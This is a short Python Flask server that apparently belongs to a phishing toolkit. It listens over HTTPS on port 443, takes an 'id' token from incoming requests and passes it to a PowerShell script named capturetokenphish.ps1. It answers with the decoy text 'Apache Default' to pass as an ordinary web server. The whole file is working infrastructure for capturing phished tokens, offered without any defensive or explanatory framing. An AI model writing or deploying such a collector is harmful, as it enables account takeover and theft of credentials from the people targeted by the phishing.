from flask import Flask, request
import argparse
from subprocess import call

app = Flask(__name__)

@app.route("/", methods=['GET'])
def hello():
    token = request.args.get("id")
    print(call(["/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
    return "Apache Default"

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', type=str, required=False,default="0.0.0.0")
    parser.add_argument('-p', '--port', type=str, required=False,default=443)
    args = parser.parse_args()
    app.run(host=args.ip,port=args.port,ssl_context=('certs/cert.pem', 'certs/privkey.pem'))